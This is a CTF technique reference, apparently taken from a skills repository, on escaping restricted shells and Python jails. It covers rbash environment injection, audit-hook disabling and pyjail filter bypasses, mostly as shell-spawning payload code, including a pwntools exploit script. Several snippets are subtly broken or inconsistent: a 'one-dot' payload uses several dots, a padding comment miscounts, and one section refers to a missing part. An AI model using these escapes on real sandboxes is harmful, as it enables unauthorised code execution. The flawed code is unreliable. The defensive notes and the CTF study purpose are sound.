# Complementary upstream techniques

Source: ljagiello/ctf-skills at c332c7be1b27cb64639a20124ac55ba916adef92 (MIT), retrieved 2026-10-01. Read the prerequisites for each technique; historical examples do not authorize infrastructure interaction.

## 2024 Hardening Note — rbash Is NOT a Security Boundary

**Reality:** `rbash` (restricted bash) is a *usability* feature, not a security boundary. Challenges and real deployments that rely on `rbash` alone are trivially bypassed via environment vectors and container escapes.

**Container / sandbox detection (check first):**
```bash
ls -la /.dockerenv           # Docker marker
cat /proc/self/cgroup        # "docker" / "kubepods" / "containerd" entries
cat /proc/self/mountinfo | grep -q overlay && echo "container overlayfs"
# seccomp profile active?
grep -i seccomp /proc/self/status
cat /proc/self/seccomp 2>/dev/null || grep Seccomp /proc/self/status
```

**Env vector — BASH_ENV / ENV / SHELLOPTS via `VAR=value allowed-cmd`:**
`rbash` allows `VAR=value command` prefixes on allowed binaries. `BASH_ENV` (bash), `ENV` (sh), and `SHELLOPTS` are parsed on startup of *non-interactive* shells:

```bash
# If `env` or any command with VAR= prefix is allowed:
BASH_ENV=/tmp/pwn.sh bash -c 'allowed_file'
# /tmp/pwn.sh runs before the command: e.g. echo 'bash -p' > /tmp/pwn.sh
# NOTE: BASH_ENV is only sourced by non-interactive bash subshells, so the
# wrapped command must actually invoke bash (bash -c '...'); a non-bash
# binary such as `cat` never sources BASH_ENV.

# Variant via ENV (POSIX sh) and SHELLOPTS:
ENV=/tmp/pwn.sh sh -c 'allowed_cmd'
SHELLOPTS=xtrace BASH_ENV=/tmp/pwn.sh bash -c 'allowed_cmd'

# General bypass:
VAR=value allowed-cmd   # VAR propagates as env; BASH_ENV/ENV triggers source on shell init
```

**Mitigations to check / recommend:**
- Unset `BASH_ENV`, `ENV`, `SHELLOPTS`, `LD_PRELOAD`, `LD_LIBRARY_PATH` on shell entry (`env -i` or `unset`)
- Check `/.dockerenv`, `/proc/self/cgroup`, and `seccomp` status before assuming `rbash` confinement
- Use `seccomp` filters + proper container (not just rbash) for isolation

**Key insight:** rbash NOT boundary — check `/.dockerenv` + `/proc/self/cgroup` + `seccomp`, and exploit `BASH_ENV`/`ENV`/`SHELLOPTS` via `VAR=value allowed-cmd` env injection when any `VAR= cmd` prefix is permitted.

## Audit-Hook (PEP 551/578) Trampoline Escapes

Audit hooks (`sys.addaudithook`, PEP 551) and `sys.audit` (PEP 578) are **monitoring**, not a sandbox. Any hook installed at Python level can be mutated; lifecycle hooks fire before/after the security-relevant event; native state can be cleared. Four trampoline families below all achieve the same goal: run `eval`/`exec` outside the hook's view. <!-- audit-ok -->

> **Defensive box:** Audit hooks are monitoring not sandbox — they are observability, not containment. If your threat model requires blocking `exec`/`eval`/`compile`/`import`, enforce it with a real sandbox (seccomp, subprocess isolation, AST allow-list that *removes* nodes rather than merely auditing them). An attacker who can run arbitrary Python can always reach `sys`/`signal`/`ctypes` and disable a pure-Python hook. Treat `audit` events as alerts, never as policy enforcement.

### Family 1 — Python-Level Hook Mutation

**Server snippet:**

```python
import sys

def audit_hook(event, args):
    if event in ("exec", "compile", "import"):  # try to block code execution
        raise RuntimeError(f"blocked: {event} {args!r}")

sys.addaudithook(audit_hook)

# jail loop
while True:
    code = input(">>> ")
    # naive: assumes hook cannot be removed
    eval(code)  # <!-- audit-ok -->
```

**Why it fails:** `sys.addaudithook` appends to the interpreter's C-level hook list — there is no `sys.audit_hooks` attribute to clear (it does not exist in any CPython release). But the hook itself is still a Python function object reachable from the jail's namespace, so mutate the function instead of the list.

**Payload sketch — closure-cell overwrite (no ctypes needed):**

```python
import sys
# The hook list lives in C (interp->audit_hooks); no sys.audit_hooks exists.
# Mutate the hook function object itself instead:
# 1) Closure-cell overwrite — flips a flag the hook closes over:
for cell in (audit_hook.__closure__ or ()):
    try:
        cell.cell_contents = False
    except (TypeError, ValueError):
        pass
# 2) Code-object swap — silence the hook entirely:
audit_hook.__code__ = (lambda event, args: None).__code__
eval("__import__('os').system('sh')")  # <!-- audit-ok --> — hook now silent
```

**Alternative — signal-handler trampoline (executes outside the audited `eval` event):**

```python
import signal  # <!-- audit-ok -->
signal.signal(signal.SIGALRM, lambda s, f: __import__('os').system('sh'))  # <!-- audit-ok -->
signal.alarm(1)
import time; time.sleep(2)  # handler fires outside the exec/compile audit path
```

### Family 2 — Lifecycle `__repr__` After `eval` (calc-defanged)

**Server snippet (calc-defanged):**

```python
import sys

def audit_hook(event, args):
    if event == "exec":
        raise SystemExit("no exec")

sys.addaudithook(audit_hook)

while True:
    expr = input("calc> ")
    # "safe" eval — hook blocks exec, but eval is allowed
    result = eval(expr)  # <!-- audit-ok -->
    # lifecycle: repr is called AFTER eval returns, outside the audited call
    print(repr(result))
```

**Payload sketch:** Return an object whose `__repr__` does the real work — it executes after `eval` has already passed the audit.

```python
# Input to the calc:
class R:
    def __repr__(self):
        __import__('os').system('sh')
        return "pwned"
R()
# eval("R()") returns R() instance — audit saw only "eval", not "exec"
# print(repr(result)) triggers R.__repr__ -> sh — no exec audit event
```

This is the "calc-defanged" pattern: the service audits `exec`/`compile` but leaves `eval` open, assuming `eval` can't execute statements. A `__repr__`/`__str__`/`__del__` trampoline runs arbitrary code in the *print* phase, which the hook never sees as an `exec` event.

### Family 3 — Signal Handler Trampoline (ImaginaryCTF — calc with `signal.signal(SIGALRM, ...)`)

**Server snippet (ImaginaryCTF calc):**

```python
import sys, signal

def audit_hook(event, args):
    if event in ("exec", "compile"):
        raise RuntimeError("blocked")

sys.addaudithook(audit_hook)
signal.signal(signal.SIGALRM, lambda s,f: sys.exit(1))
signal.alarm(5)

while True:
    code = input(">>> ")
    eval(code)  # <!-- audit-ok --> — only eval allowed, import blocked by audit
```

**Payload sketch:** `signal.signal` lets you register a Python callable as an async trampoline. The handler is invoked by the interpreter outside the normal `eval` audit path.

```python
import signal, os

# Register shell as SIGALRM handler — audit sees only signal.signal, not exec
signal.signal(signal.SIGALRM, lambda s,f: os.system("sh"))

# Trigger it
signal.raise_signal(signal.SIGALRM)
# or: signal.alarm(1); __import__('time').sleep(2)
# Alternative: SIGUSR1 / SIGINT — any signal the jail forwards
```

Why the hook misses it: `signal.signal` audits as `signal.signal` (often allow-listed as "safe"), and the subsequent `os.system` runs inside the C signal handler dispatch, which many hook deployments forget to audit. ImaginaryCTF's calc whitelisted `signal` as "needed for timeout", giving a full trampoline.

### Family 4 — Native `_PyRuntime` Clear (DiceCTF — IRS)

**Server snippet (DiceCTF IRS — native hook):**

```python
# C extension installs hook via PySys_AddAuditHook / _PyRuntime.audit_hooks
import sys
# Hook installed at import time from C — not visible as Python object
import irs_hook  # sets _PyRuntime.audithook_head -> c_hook

while True:
    code = input(">>> ")
    eval(code)  # <!-- audit-ok --> — C hook audits exec/compile
```

**Payload sketch:** Even a C-level hook's head pointer lives in writable memory. With `ctypes`, clear it.

```python
import ctypes, sys

# Find _PyRuntime in memory — via ctypes.pythonapi
# CPython 3.11+: _PyRuntime is exported; audit hook list at known offset
# Brute-force search for the hook pointer:
lib = ctypes.pythonapi
# _PyRuntime is a struct; audit_hooks is a linked list head
# DiceCTF IRS used:
#   ctypes.pythonapi.PySys_AddAuditHook  -> to add, so we locate the head

# Simplest IRS payload (from public writeup):
import ctypes
# Overwrite _PyRuntime.audit_hooks head with NULL
# Address discovered via `ctypes.pythonapi._PyRuntime` (exported symbol)
try:
    py_runtime = ctypes.c_void_p.in_dll(ctypes.pythonapi, "_PyRuntime")
    # offset of audit_hooks within _PyRuntime — version-dependent, brute-forced
    # DiceCTF used offset 0x...; generic scan:
    # WARNING: blind 4096-byte scanning of _PyRuntime is unstable — the struct
    # layout (and whether _PyRuntime is even exported) changes between CPython
    # minor versions (3.10 vs 3.11 vs 3.12). Zeroing a wrong offset segfaults
    # the interpreter or corrupts GC state. Pin the exact minor version first
    # (sys.version_info) and prefer a known offset over a blind scan.
    for off in range(0, 4096, 8):
        ptr = ctypes.cast(py_runtime.value + off, ctypes.POINTER(ctypes.c_void_p))
        # heuristic: non-null linked list head
        if ptr.contents and ptr.contents.value:
            ptr.contents.value = 0  # clear hook chain
            break
except ValueError:
    pass

# Now exec is unaudited
eval("__import__('os').system('sh')")  # <!-- audit-ok -->
# or: exec("import os; os.system('cat flag')")  # <!-- audit-ok -->
```

**Takeaway:** If the attacker can get `ctypes`/`cffi`/`mmap`, any in-process Python-level or even C-level audit hook is just bytes in writable memory. The only robust boundary is out-of-process (seccomp, namespaces, `setrlimit`, separate UID).

---

## Filter'd Length-Limit Re-evaluation (JailCTF 2024 — M=14)

**Server code (M=14):**

```python
M = 14  # max input length — tiny

def f(s: str):
    # re-evaluation gate: only eval if normalized length is small
    if len(s) > M:
        return "too long"
    # block import/system/exec/eval at first glance
    if any(w in s for w in ("import", "os", "system", "exec", "eval", "compile")):
        return "blocked"
    return eval(s)  # <!-- audit-ok --> — intended as "safe" because M is small

while True:
    print(f(input(">>> ")))
```

**Idea:** `M=14` blocks `import os;os.system('sh')` outright, but `f` is itself exposed. Feed `f` a string that *returns* a longer string, then re-evaluate via `f(i())`.

**Triple `pwntools` script — `i=input;f(i())` → `M=99;f(i())` → `import os;os.system('sh')`:**

```python
from pwn import *

r = remote("jail.ctf", 1337)

# Stage 1: define shorthand and re-enter f with longer budget
# "i=input;f(i())" — len 12 ≤ 14, sets i=input and immediately re-prompts via f(i())
# Server does eval("i=input;f(i())") -> eval returns result of f(i())
# The inner i() reads the NEXT line from stdin as code
r.sendline(b"i=input;f(i())")  # Stage 1 payload, M=14 passes

# Stage 2: inside f(i()), send "M=99;f(i())" — this runs as eval("M=99;f(i())")
# Now M is 99, and we again trampoline via f(i()) with a larger limit
r.sendline(b"M=99;f(i())")    # Stage 2, re-uses same trick to widen M

# Stage 3: now we have 99 chars — enough for RCE
r.sendline(b"import os;os.system('sh')")
r.interactive()
# Alternative final payloads if import still filtered at stage 3:
#   __import__('os').system('sh')
#   breakpoint()  # unblocked -> pdb -> !import os; os.system('sh')
#   help()        # unblocked -> pager -> !sh
```

**Why `breakpoint`/`help` are RCE:** The filter blocklist in the challenge forgot `breakpoint` (enters `pdb`, which has `!` shell escape) and `help` (enters `pydoc` pager `less`/`more` with `!sh`). Both are unaudited code-execution primitives. The length-limit re-evaluation turns a 14-char jail into an unbounded one in two hops — the classic "filter'd" trick is that `f` itself is the oracle that lifts its own limit.

**Defensive note:** Never re-evaluate user input through the same `eval` path. If you must enforce a length limit, enforce it on the *original* input only and do not expose `f`/`eval`/`exec` as callable objects inside the evaluated namespace.

---

## Modern Filter Trio: impossible / one / primal

Three 2024–2026 jails that each allow only *one* narrow primitive. All bypasses use only the allowed primitive plus Python's data model.

### impossible — No `()` (parentheses banned)

**Filter:** `if "(" in code or ")" in code: block`. No calls, no tuples, no grouping.

**Bypass — `__getitem__` rebind:** Subscript `[]` is still allowed and triggers `__getitem__`. Rebind it to a callable, then "call" via `obj[args]`.

```python
# Server: eval(code) with "(" and ")" stripped, but [] and . allowed
# Goal: get shell without ever typing ()

# Step 1: Find a class whose __getitem__ we can overwrite
# list's __getitem__ is slot wrapper (read-only), but dict subclasses are mutable
class E(dict):
    pass

# Step 2: Rebind __getitem__ to exec/eval (staticmethod avoids implicit self binding)
E.__getitem__ = staticmethod(eval)  # <!-- audit-ok --> — now E()["__import__('os').system('sh')"] would be a call, but we can't use ()
# Subscript form: E()["payload"] triggers eval("payload") with no parens
# But we still need to avoid () in payload itself — use [] form inside too

# Actual impossible payload (from writeup):
# Use __class_getitem__ / __getitem__ as call trampoline
#   import os via __loader__ trick without parens: use [] to invoke
# Minimal core:
#   ().__class__.__getitem__ = eval  — fails on tuple (immutable), so use a custom class
# Worked payload skeleton:
#   class X: __getitem__ = __import__('os').system  # via decorator trick
#   X()["sh"]  # subscript == call, no ()

# Full chain (no parens anywhere):
# Use decorator to rebind without = or () — see Decorator-Based Escape above
# Then:
#   obj = SomeClass()
#   obj["__import__('os').system('sh')"]  # triggers eval/system via __getitem__
```

**Key insight:** `obj[args]` is `type(obj).__getitem__(obj, args)` — a full call with no `()` in source. If the jail allows `[]` and attribute assignment (or decorator rebinding), `__getitem__` is a universal call gadget.

### one — One Dot (single `.` allowed)

**Filter:** `if code.count(".") != 1: block`. Exactly one dot in the entire payload.

**Bypass — `cache.__getattribute__` lambda:** Use the single dot to steal `__getattribute__`, then never need another dot.

```python
# Server: code.count(".") == 1, eval(code)

# The one dot: cache.__getattribute__ — from that we get a bound method
# that can fetch any attribute without further dots
#   cache = [1].__class__.__base__.subclasses()[...]  — but that needs dots
# Trick: the single dot IS the getattr primitive

# Payload skeleton (one dot total):
#   (lambda g: g("system")("sh"))(().__class__.__base__.__subclasses__()[...].__dict__["os"].__getattribute__)
# But we need to compress to one dot — real trick uses cache:

# From public writeup (simplified):
#   Use the one dot to get __getattribute__ from a known object that already has it
#   e.g. "".__getattribute__  — that's the one dot
#   Then use it as a function to fetch further attributes functionally:

# One-dot RCE (concept):
get = "".__getattribute__  # the single dot
# Now no more dots needed — use get(obj, "attr") instead of obj.attr
cls = get("", "__class__")
base = get(cls, "__base__")
subs = get(base, "__subclasses__")()
# ... find os / Popen and call via get(..., "__call__") or __getitem__ trick
```

**Why it works:** `object.__getattribute__` is the universal attribute fetch. One dot gives you the bound method; from there every `obj.attr` becomes `get(obj, "attr")` — a call with no dots. Combine with the `__getitem__` trick above to avoid further calls if `()` is also limited.

### primal — Prime Length (`len(code)` must be prime)

**Filter:** `if not is_prime(len(code)): block` and `eval(code)` with a small prime window (e.g. 2..101). Often combined with charset limits.

**Bypass — `reduce_ex` + hex escapes:** Pad to the next prime with comments/whitespace, then use hex escapes to smuggle arbitrary bytes without growing length uncontrollably.

```python
# Server:
def is_prime(n):
    return n > 1 and all(n % i for i in range(2, n))

while True:
    code = input(">>> ")
    if not is_prime(len(code)):
        print("length must be prime")
        continue
    eval(code)  # <!-- audit-ok -->
```

**Bypass strategy:**

```python
# 1. Build payload via hex escapes (\x6f\x73 -> "os") to keep charset minimal
# 2. Use reduce_ex / __reduce_ex__ as call gadget if () is limited
# 3. Pad to prime with "# comment" or " ;pass" — comments don't affect semantics

# Example: want `__import__('os').system('sh')` but need prime length
payload = "__import__('\\x6f\\x73').system('\\x73\\x68')"
# len(payload) = 38 (not prime) -> pad to 41 (prime)
payload_padded = payload + " #aaa"  # 38+4=42 still not prime, try 41
# Brute force padding:
for pad in range(20):
    cand = payload + " " + "#" * pad
    if is_prime(len(cand)):
        print(cand, len(cand))
        break

# Alternative primal trick: use `1 .__reduce_ex__(2)` style to get code execution
# via pickle reduce without import, then hex-escape the pickle bytes
#   b"\x80\x04\x95..." -> payload via "\x80\x04..." string
```

**Key insight:** A prime-length check is not a security boundary — it is just a padding puzzle. Comments (`#`), semicolons, whitespace, and hex escapes (`\x41`) let you hit any prime in the allowed window without changing semantics. Combine with `__getitem__`/`__getattribute__` gadgets above to handle any additional filter the primal challenge layers on.

**References:** PlaidCTF 2024 `impossible`/`one`/`primal` trio; JailCTF 2024 `filter'd`; ImaginaryCTF 2024 `calc`; DiceCTF 2023 `IRS`
